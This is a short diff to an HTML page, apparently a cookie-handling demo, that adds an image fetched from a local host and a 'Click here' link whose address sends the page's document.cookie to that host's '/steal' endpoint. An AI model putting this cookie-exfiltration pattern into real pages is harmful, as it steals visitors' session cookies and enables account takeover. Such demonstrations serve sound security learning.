@@ -8,12 +8,17 @@
 </head>
 
 <body>
+    <img src="http://minint-5bg2eb6:8080/img"/>
+    <a id="aSteal">Click here </a>
     <button id="btnCreateCookie">Create Cookie</button>
     <script>
         const btnCreateCookie = document.getElementById('btnCreateCookie');
         btnCreateCookie.addEventListener("click", e=>{
             document.cookie = "PalaniTest=100";
         });
+
+        const s = document.getElementById("aSteal");
+        s.href = `http://minint-5bg2eb6:8080/steal?c=${document.cookie}`;
     </script>
 </body>
 
